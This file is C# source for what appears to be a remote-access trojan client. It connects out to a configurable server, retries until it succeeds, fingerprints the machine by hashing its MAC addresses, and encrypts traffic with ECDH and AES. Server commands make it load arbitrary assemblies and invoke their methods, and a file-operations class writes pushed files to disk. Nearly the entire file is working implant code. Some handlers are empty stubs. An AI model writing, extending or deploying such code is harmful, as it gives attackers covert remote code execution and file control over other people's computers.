using System;
using COM_PACKAGE_CLIENT;
using System.Reflection;

namespace MAJIKMATTER
{
    class Program
    {
        private static CLIENT_COM client;
        private static Object keepALive;
        private static DATA FAULT(DATA d)
        {
            d = client.Connect(d);
            d = client.IO(d);
            return d;
        }
        private static DATA TASK(DATA d)
        {
            try {
                if (d.packet.flag.Equals("REQUEST_ID"))
                {
                    d.packet = new PACKET();
                    var ID = new Identify.IDmaker();
                    d.packet.flag = "RETURN_ID";
                    d.packet.data = ID.hash;
                } else
                if (d.packet.flag.Equals("PING"))
                {
                    d.packet = new PACKET();
                    d.packet.flag = "RETURN_PING";
                    d.packet.data = d.client.Client.LocalEndPoint.ToString() + "::" + DateTime.Now.ToString();
                } else
                if (d.packet.flag.Contains("ASM"))
                {
                    
                    d = assymble(d);
                }
                else
                if (d.packet.flag.Equals("REFLECT"))
                {
                    
                    d = reflect(d);
                }
                
            }catch(Exception e)
            { d.packet.flag = "TASK_ERROR"; d.packet.data = e.ToString(); }
            //RETURN TASK DATA
            if (d.useCng)
            { d = client.SendWithCng(d); d.packet = new PACKET(); }                
            else
            { d = client.Send(d); d.packet = new PACKET(); }
            return d;
        }        
        private static DATA reflect(DATA d)
        {
            try {
                string ret = "Classes:\n";
                PACKET pack = d.packet;
                d.packet = new PACKET();
                Assembly Asm = Assembly.LoadFrom(pack.ip);
                Type[] myTypes = Asm.GetTypes();
                Type myClass = null;
                foreach (var type in myTypes)
                {
                    ret += type.ToString()+"\r\n";

                    if (type.Name.Equals(pack.arg))
                    {
                        myClass = type;
                    }                    
                }
                ret += "Methods:\r\n";
                if (myClass != null)
                {
                    MethodInfo[] methods = myClass.GetMethods();
                    foreach (var method in methods)
                    {
                        ret += method.ToString() + "\r\n";
                    }
                }
                d.packet.flag = "RETURN_ASM";
                d.packet.data = ret;
            }catch(Exception e)
            { d.packet.flag = "ASM_ERROR"; d.packet.data = e.ToString(); }
            return d;
        }
        private static DATA assymble(DATA d)
        {
            try {
                String returnFlag = null;
                if(d.packet.flag.Contains(","))
                {
                    var split = d.packet.flag.Split(',');
                    returnFlag = split[1];
                }
                PACKET pack = d.packet;
                d.packet = new PACKET();
                Assembly Asm = Assembly.LoadFrom(pack.ip);
                Type[] myTypes = Asm.GetTypes();
                Type myClass = null;
                foreach (var type in myTypes)
                {
                    if (type.Name.Equals(pack.arg))
                    {
                        myClass = type;
                    }
                }
                if (myClass != null)
                {
                    MethodInfo[] methods = myClass.GetMethods();
                    MethodInfo myMethod = null;
                    foreach (var method in methods)
                    {
                        if (method.Name.Equals(pack.length))
                        {
                            myMethod = method;
                        }
                    }
                    if (myMethod != null)
                    {
                        keepALive = Activator.CreateInstance(myClass);

                        if (pack.data.Equals("NOARG"))
                        {                            
                            d.packet.data = (String)myMethod.Invoke(keepALive, null);
                            
                        }
                        else
                        {
                            Object[] arguments = new object[1] {pack.data }; 
                            d.packet.data = (String)myMethod.Invoke(keepALive, arguments);
                           
                        }
                    }
                    if (returnFlag != null)
                        d.packet.flag = returnFlag;
                    else
                        d.packet.flag = "RETURN_ASM";
                }
            }catch(Exception e)
            { d.packet.flag = "ASM_ERROR"; d.packet.data = e.ToString(); }
            return d;
        }
        static void Main(string[] args)
        {
            client = new CLIENT_COM();
            DATA cd = new DATA();
            cd.RHOST = "127.0.0.1";
            cd.RPORT = 10101;
            cd.fault = FAULT;
            cd.task = TASK;
            try {   
                if (args.Length>0)
                {
                    cd.RHOST = args[0];
                    if (args.Length > 1)
                    {
                        if (args[1].Length < 10)
                        { cd.RPORT = Convert.ToInt32(args[1]); }                        
                    }
                }
                cd = client.Connect(cd);
                cd = client.IO(cd);
                client.data = cd;
                while (true) { System.Threading.Thread.Sleep(5000); }
            }
            catch (Exception)
            {
                Console.WriteLine("\nError in Main()");
                FAULT(cd);
            }
        }
    }
}
namespace COM_PACKAGE_CLIENT
{
    using System;
    using System.Net.Sockets;
    using System.ComponentModel;
    public struct PACKET
    {
        public String ip;
        public String arg;
        public String length;
        public String flag;
        public String data;
        public Byte[] bytes;
    }
    public struct DATA
    {
        public BackgroundWorker worker;
        public Func<DATA, DATA> fault;
        public Func<DATA, DATA> task;
        public PACKET packet;
        public String RHOST;
        public Int32 RPORT;
        public TcpClient client;
        public NetworkStream stream;
        public String data;
        public Byte[] bytes;
        public String host;
        public String port;
        public ECDHAES256.CNG keycng;
        public bool useCng;
        public ECDHAES256.DH dh;
    }
    public class CLIENT_COM
    {
        
        public DATA data { get; set; }
        public CLIENT_COM()
        {

            data = new DATA();
            DATA d = new DATA();
            d.RHOST = "127.0.0.1";
            d.RPORT = 10101;
            data = d;
        }



        private static String addHEAD(int data, PACKET packet)
        {
            String[] HEADER = new String[6];
            HEADER[0] = "<START>";
            HEADER[1] = "<IP>" + packet.ip;
            HEADER[2] = "<ARG>" + packet.arg;
            HEADER[3] = "<LENGTH>" + System.Convert.ToString(data);
            HEADER[4] = "<FLAG>" + packet.flag;
            HEADER[5] = "<DATA>";
            return HEADER[0] + HEADER[1] + HEADER[2] + HEADER[3] + HEADER[4] + HEADER[5];
        }
        private static String addFOOT()
        {
            return "<END>";
        }
        private static Byte[] buildRequest(PACKET packet)
        {
            //CAN ADD AES HERE TO ENCRPYT PACKET BEFORE RETURN
            if (packet.data == null)
            {
                String PACKET = addHEAD(0, packet) + addFOOT();
                return System.Text.Encoding.ASCII.GetBytes(PACKET);

            }
            else {
                String PACKET = addHEAD(packet.data.Length, packet) + packet.data + addFOOT();
                return System.Text.Encoding.ASCII.GetBytes(PACKET);

            }
        }
        private static DATA makePacket(DATA d)
        {
            try {
                String dat = System.Text.Encoding.ASCII.GetString(d.packet.bytes, 0, d.packet.bytes.Length);
                d.bytes = d.packet.bytes;
                d.packet = new PACKET();
                if (dat.Contains("<SPLIT>"))
                {
                    dat = dat.Replace("<SPLIT>", "~");
                    String[] tmp = dat.Split('~');
                    d.keycng.iv = Convert.FromBase64String(tmp[0]);
                    tmp = tmp[1].Split('\0');
                    d.keycng.encryptedBytes = Convert.FromBase64String(tmp[0]);
                    tmp = null;

                    ECDHAES256.AES crypto = new ECDHAES256.AES();
                    crypto.cng = crypto.decrypt(d.keycng); //TODO PROBLEM HERE
                    d.keycng.plaintextBytes = crypto.cng.plaintextBytes;

                    dat = System.Text.Encoding.ASCII.GetString(d.keycng.plaintextBytes, 0, d.keycng.plaintextBytes.Length);
                    d.keycng.plaintextBytes = null;
                    d.keycng.encryptedBytes = null;
                    d.keycng.iv = null;
                }
                if (dat.Contains("<ARG>") && dat.Contains("<LENGTH>") && dat.Contains("<FLAG>") && dat.Contains("<DATA>") && dat.Contains("<END>"))
                {
                    try
                    {
                        String[] valid = { "<ARG>", "<LENGTH>", "<FLAG>", "<DATA>", "<END>" };
                        dat = dat.Replace("<START>", "");
                        dat = dat.Replace("<IP>", "");
                        int i;
                        for (i = 0; i < valid.Length; ++i)
                        {
                            dat = dat.Replace(valid[i], "~");
                        }
                        String[] dd = dat.Split('~');
                        if (dd.Length > 1)
                        {
                            d.packet.ip = dd[0];
                            d.packet.arg = dd[1];
                            d.packet.length = dd[2];
                            d.packet.flag = dd[3];
                            d.packet.data = dd[4];
                        }
                        else {
                            d.packet.arg = "";
                            d.packet.ip = "";
                            d.packet.length = "-1";
                            d.packet.flag = "";
                            d.packet.data = "";
                        }
                        return d;
                    }
                    catch (Exception)
                    {
                        Console.WriteLine("\nError in makePacket");
                        PACKET pack = new PACKET();
                        pack.arg = "";
                        pack.ip = "";
                        pack.length = "-1";
                        pack.flag = "";
                        pack.data = "";
                        d.packet = pack;
                    }
                }
            }catch(Exception)
            { d.packet = new PACKET(); d.packet.length = "-1"; }
            return d;
        }
        private static void worker_DoWork(object sender, DoWorkEventArgs e)
        {
            try
            {

                DATA d = (DATA)e.Argument;
                d.packet = new PACKET();
                d.packet.bytes = new Byte[40960];
                Int32 i = d.stream.Read(d.packet.bytes, 0, d.packet.bytes.Length);

                e.Result = d;
            }
            catch (Exception) { e.Result = (DATA)e.Argument; } // add -1 for error server disconnected
        }
        private static void worker_RunWorkerCompleted(object sender, RunWorkerCompletedEventArgs e)
        {
            try
            {

                DATA d = (DATA)e.Result;
                String dat = System.Text.Encoding.ASCII.GetString(d.packet.bytes, 0, d.packet.bytes.Length);
                
                d = makePacket(d);
                if (!d.packet.length.Equals("-1")) //safety
                {
                    if (d.task != null)
                    { d = d.task(d); }
                }                
                d.packet = new PACKET();
                if(d.worker!=null)
                { d.worker.RunWorkerAsync(d); }
                else
                {
                    d.client.Close();
                    if (d.fault != null)
                    { d = d.fault.Invoke(d); }
                    Console.WriteLine("\nPROGRAM HALT connection fault");
                }
                
            }
            catch (Exception)
            {
                Console.WriteLine("\nERROR connection dropped in RunWorkerCompleted");
                DATA d = (DATA)e.Result;
                if (d.fault != null)
                { d = d.fault.Invoke(d); }
            }
        }
        private static BackgroundWorker createRecvWorker()
        {
            //Program p = new Program(); //possible problem
            BackgroundWorker backgroundWorker1 = new BackgroundWorker();
            backgroundWorker1.DoWork += new System.ComponentModel.DoWorkEventHandler(worker_DoWork);
            backgroundWorker1.RunWorkerCompleted += new System.ComponentModel.RunWorkerCompletedEventHandler(worker_RunWorkerCompleted);
            return backgroundWorker1;
        }
        private static String packetToString(PACKET p)
        {
            return "<START>" + "<IP>" + p.ip + "<ARG>" + p.arg + "<LENGTH>" + p.length + "<FLAG>" + p.flag + "<DATA>" + p.data + "<END>";
        }
        private static String BASE64(Byte[] datas)
        {
            return Convert.ToBase64String(datas);
        }
        private static Byte[] FROMBASE64(String str)
        {
            return Convert.FromBase64String(str);
        }
        public  DATA Send(DATA d, bool useCompression=false)
        {


            d.packet.ip = "";
            d.packet.bytes = buildRequest(d.packet);
            if (d.stream.CanWrite) //send alice public key
            {
                d.stream.Write(d.packet.bytes, 0, d.packet.bytes.Length);
            }
            return d;
        }
        public DATA SendWithCng(DATA d, bool useCompression = false)
        {
            try
            {
                d.keycng.plaintextBytes = buildRequest(d.packet);
                ECDHAES256.AES crypto = new ECDHAES256.AES();

                crypto.cng = crypto.encrypt(d.keycng);
                d.keycng.plaintextBytes = null;
                String IVandENC = BASE64(crypto.cng.iv) + "<SPLIT>" + BASE64(crypto.cng.encryptedBytes);
                if (useCompression)
                {
                    ZIP.Compression zipper = new ZIP.Compression();
                    d.bytes = zipper.CompressStringToBytes(IVandENC); 
                }
                else
                {
                    d.bytes = System.Text.Encoding.ASCII.GetBytes(IVandENC);
                }                
                
                if (d.stream.CanWrite)
                {
                    d.stream.Write(d.bytes, 0, d.bytes.Length);
                }
                d.packet = new PACKET();
                d.bytes = null;
                d.keycng.iv = null;
                d.keycng.encryptedBytes = null;
                return d;
            }
            catch (Exception)
            {
                Console.WriteLine("\nERROR in SendWithCng");
                d.packet = new PACKET();
                d.bytes = null;
                d.keycng.iv = null;
                d.keycng.encryptedBytes = null;
                d.useCng = false;
                return d;
            }

        }
        public  DATA Connect(DATA d)
        {           
                try
                {
                    d.client = new TcpClient(d.RHOST, d.RPORT);
                }
                catch (Exception) { Console.WriteLine("\nERROR connecting to Server"); System.Threading.Thread.Sleep(2000); d = Connect(d); return d; }           
            return d;

        }
        public  DATA IO(DATA d, bool useCng = true)
        {
            d.stream = d.client.GetStream();
            if (d.client.Connected)
            {
                d.stream = d.client.GetStream();
                //ASYNC RECV
                d.worker = createRecvWorker();
                if (useCng == true)
                {
                    d.dh = new ECDHAES256.DH();
                    d.keycng = new ECDHAES256.CNG();
                    d.packet = new PACKET();
                    d.packet.bytes = new Byte[4096];
                    Int32 i = d.stream.Read(d.packet.bytes, 0, d.packet.bytes.Length);
                    d = makePacket(d);
                    if (!d.packet.flag.Equals("INIT")) { return d; }
                    d.keycng.bpublicKey = FROMBASE64(d.packet.data);
                    d.keycng = d.dh.b(d.keycng); //MAKE KEY               

                    d.packet = new PACKET();
                    d.packet.flag = "RET_INIT";
                    d.packet.data = BASE64(d.keycng.publicKey);
                    d = Send(d);
                    d.useCng = true;
                    d.dh = null;
                    d.keycng.publicKey = null;
                    d.keycng.bpublicKey = null;
                    d.keycng.bob = null;
                    d.keycng.alice = null;
                }
                d.worker.RunWorkerAsync(d);
                return d;
            }
            return d;
        }
    }
}
namespace ECDHAES256
{
    using System;
    using System.IO;
    using System.Security.Cryptography;
    public struct CNG
    {
        public CngKey cngkey;
        public CngKey bcngkey;
        public ECDiffieHellmanCng alice;
        public ECDiffieHellmanCng bob;
        public Byte[] key;
        public Byte[] bkey;
        public Byte[] iv;
        public Byte[] publicKey;
        public Byte[] bpublicKey;
        public Byte[] encryptedBytes;
        public Byte[] plaintextBytes;
    }
    public class AES
    {
        public CNG cng { get; set; }
        public AES()
        {
            cng = new CNG();
        }
        public CNG encrypt(CNG c)
        {
            EncryptMessage(c.key, c.plaintextBytes, out c.encryptedBytes, out c.iv);
            c.plaintextBytes = null;
            return c;
        }
        private void EncryptMessage(Byte[] key, Byte[] plaintextMessage, out Byte[] encryptedMessage, out Byte[] iv)
        {
            using (Aes aes = new AesCryptoServiceProvider())
            {
                aes.Key = key;
                iv = aes.IV;
                using (MemoryStream ciphertext = new MemoryStream())
                using (CryptoStream cs = new CryptoStream(ciphertext, aes.CreateEncryptor(), CryptoStreamMode.Write))
                {
                    cs.Write(plaintextMessage, 0, plaintextMessage.Length);
                    cs.Close();
                    encryptedMessage = ciphertext.ToArray();
                }

            }
        }
        public CNG decrypt(CNG c)
        {
            DecryptMessage(out c.plaintextBytes, c.encryptedBytes, c.iv, c.key);
            c.encryptedBytes = null;
            c.iv = null;
            return c;
        }
        private void DecryptMessage(out Byte[] plaintextBytes, Byte[] encryptedBytes, Byte[] iv, Byte[] bkey)
        {

            using (Aes aes = new AesCryptoServiceProvider())
            {
                aes.Key = bkey;
                aes.IV = iv;
                // Decrypt the message
                using (MemoryStream plaintext = new MemoryStream())
                {
                    using (CryptoStream cs = new CryptoStream(plaintext, aes.CreateDecryptor(), CryptoStreamMode.Write))
                    {
                        cs.Write(encryptedBytes, 0, encryptedBytes.Length);
                        cs.Close();
                        encryptedBytes = null;
                        plaintextBytes = plaintext.ToArray();
                    }
                }
            }
        }
    }
    public class DH
    {
        private static CNG cng;
        public DH()
        {
            cng = new CNG();
        }
        public CNG a(CNG c)
        {
            if (c.alice == null)
            {
                c.alice = new ECDiffieHellmanCng();

                c.alice.KeyDerivationFunction = ECDiffieHellmanKeyDerivationFunction.Hash;
                c.alice.HashAlgorithm = CngAlgorithm.Sha256;
                c.publicKey = c.alice.PublicKey.ToByteArray();
                c.encryptedBytes = null;
                c.iv = null;
                c.plaintextBytes = null;
                return c;

            }
            if (c.alice != null)
            {

                c.cngkey = CngKey.Import(c.bpublicKey, CngKeyBlobFormat.EccPublicBlob);
                c.key = c.alice.DeriveKeyMaterial(CngKey.Import(c.bpublicKey, CngKeyBlobFormat.EccPublicBlob));
                c.encryptedBytes = null;
                c.iv = null;
                c.publicKey = null;
                c.bpublicKey = null;
                c.bob = null;
                c.encryptedBytes = null;
                c.plaintextBytes = null;
                c.alice = null;
                return c;

            }
            c.encryptedBytes = null;
            c.iv = null;
            c.publicKey = null;
            c.bpublicKey = null;
            c.bob = null;
            c.encryptedBytes = null;
            c.plaintextBytes = null;
            c.alice = null;
            return c;
        }
        public CNG b(CNG c)
        {
            if (c.bob == null)
            {
                c.bob = new ECDiffieHellmanCng();

                c.bob.KeyDerivationFunction = ECDiffieHellmanKeyDerivationFunction.Hash;
                c.bob.HashAlgorithm = CngAlgorithm.Sha256;
                c.publicKey = c.bob.PublicKey.ToByteArray();
                c.cngkey = CngKey.Import(c.bpublicKey, CngKeyBlobFormat.EccPublicBlob);
                c.key = c.bob.DeriveKeyMaterial(CngKey.Import(c.bpublicKey, CngKeyBlobFormat.EccPublicBlob));
                c.encryptedBytes = null;
                c.iv = null;
                c.bpublicKey = null;
                c.bob = null;
                c.encryptedBytes = null;
                c.plaintextBytes = null;
                c.alice = null;
                return c;

            }
            if (c.bob != null)
            {
                c.cngkey = CngKey.Import(c.bpublicKey, CngKeyBlobFormat.EccPublicBlob);
                c.bcngkey = c.cngkey;
                c.key = c.bob.DeriveKeyMaterial(CngKey.Import(c.bpublicKey, CngKeyBlobFormat.EccPublicBlob));
                c.bkey = c.key;
                c.encryptedBytes = null;
                c.iv = null;
                cng = c;
                c.encryptedBytes = null;
                c.iv = null;
                c.bpublicKey = null;
                c.bob = null;
                c.encryptedBytes = null;
                c.plaintextBytes = null;
                c.alice = null;
                return c;

            }
            c.encryptedBytes = null;
            c.iv = null;
            c.bpublicKey = null;
            c.bob = null;
            c.encryptedBytes = null;
            c.plaintextBytes = null;
            c.alice = null;
            return c;
        }
    }
}
namespace Identify
{
    using System;
    using System.Text;
    using System.Collections.Generic;
    using System.Linq;
    using System.Net.NetworkInformation;
    using System.Security.Cryptography;
    public class IDmaker
    {
        public String hash { get; private set; }
        public IDmaker()
        {
            try
            {
                var macs = GetMACAddresses();
                String prehash = "";
                foreach (var mac in macs)
                {
                    prehash += mac;
                }
                hash = getMD5Hash(prehash);
            }
            catch (Exception)
            {
                hash = "0000000000000000000";
                Console.WriteLine("\nError in IDmaker");
            }
        }
        public UInt64 getHash(String key)
        {
            char[] p = key.ToArray();
            UInt64 h = 2166136261;
            int i;

            for (i = 0; i < key.Length; i++)
            {
                h = (h * 16777619) ^ p[i];
            }

            return h;
        }
        public string getMD5Hash(string input)
        {
            MD5 md5 = System.Security.Cryptography.MD5.Create();
            byte[] inputBytes = System.Text.Encoding.ASCII.GetBytes(input);
            byte[] hash = md5.ComputeHash(inputBytes);
            StringBuilder sb = new StringBuilder();
            for (int i = 0; i < hash.Length; i++)
            {
                sb.Append(hash[i].ToString("X2"));
                //sb.Append(String.Format("{0:X2}", hash[i]));
            }
            return sb.ToString();
        }
        public IEnumerable<String> GetMACAddresses()
        {
            var macAddr =
                (
                    from nic in NetworkInterface.GetAllNetworkInterfaces()
                    where  nic.OperationalStatus == OperationalStatus.Up
                    select nic.GetPhysicalAddress().ToString()
                );

            return macAddr.ToList();
        }
    }
}
namespace IO
{
    public class FileOP
    {
        public string _currentDirectory { get; set; }
        public void FOP(PACKET packet)
        {
             if (packet.flag.Contains("PUSH")) //arg is name, data is base64 file string
            {
                byte[] bytes = Convert.FromBase64String(packet.data);
                var file = System.IO.File.Open(packet.arg, System.IO.FileMode.Create);
                file.Write(bytes, 0, bytes.Length);
                file.Close();
                packet = new PACKET();
                packet.flag = "FOP";
                packet.data = "PUSH_SUCCESS";
            }
            else if (packet.flag.Contains("GET")) //arg is name, data is base64 file string
            {

               
                byte[] bytes= System.IO.File.ReadAllBytes(packet.arg);
                string str64 = Convert.ToBase64String(bytes);                
                packet = new PACKET();
                packet.flag = "FOP";
                packet.data = "GET_SUCCESS";
            }
            else if (packet.flag.Contains("COPY")) //arg is name, data is base64 file string
            {

            }
            else if (packet.flag.Contains("CUT")) //arg is name, data is base64 file string
            {

            }
            else if (packet.flag.Contains("DELETE")) //arg is name, data is base64 file string
            {

            }
            else if (packet.flag.Contains("")) //arg is name, data is base64 file string
            {

            }

        }
    }
}
namespace ZIP
{
    using System;
    using System.Text;
    using System.IO;
    using System.IO.Compression;

    public class Compression
    {

        public byte[] getBytes { get; private set; }
        public Compression()
        { }
        public Compression(byte[] input)
        {
            getBytes = CompressBytesToBytes(input);
        }
        public Compression(byte[] bytes, long bufferSize)
        {
            getBytes = DeCompressBytesToBytes(bytes, bufferSize);
        }
        public byte[] CompressStringToBytes(string input)
        {
            using (MemoryStream resultStream = new MemoryStream())
            {
                using (DeflateStream compressionStream = new DeflateStream(resultStream,
                         CompressionLevel.Optimal))
                {
                    byte[] inBuffer = Encoding.UTF8.GetBytes(input);
                    compressionStream.Write(inBuffer, 0, inBuffer.Length);
                }
                return resultStream.ToArray();
            }
        }
        public byte[] CompressBytesToBytes(byte[] inBuffer)
        {
            using (MemoryStream resultStream = new MemoryStream())
            {
                using (DeflateStream compressionStream = new DeflateStream(resultStream,
                         CompressionLevel.Optimal))
                {
                    compressionStream.Write(inBuffer, 0, inBuffer.Length);
                }
                return resultStream.ToArray();
            }
        }

        public String DeCompressBytesToString(byte[] bytes, long OriginalSize)
        {
            using (MemoryStream resultStream = new MemoryStream(bytes))
            {
                using (DeflateStream compressionStream = new DeflateStream(resultStream,
                        CompressionMode.Decompress))
                {
                    byte[] outBuffer = new byte[OriginalSize];   // need an estimate here
                    int length = compressionStream.Read(outBuffer, 0, outBuffer.Length);
                    return Encoding.UTF8.GetString(outBuffer, 0, length);
                }
            }
        }
        public byte[] DeCompressBytesToBytes(byte[] bytes, long OriginalSize)
        {
            using (MemoryStream resultStream = new MemoryStream(bytes))
            {
                using (DeflateStream compressionStream = new DeflateStream(resultStream,
                        CompressionMode.Decompress))
                {
                    byte[] outBuffer = new byte[OriginalSize];   // need an estimate here
                    int length = compressionStream.Read(outBuffer, 0, outBuffer.Length);
                    return outBuffer;
                }
            }
        }
    }
}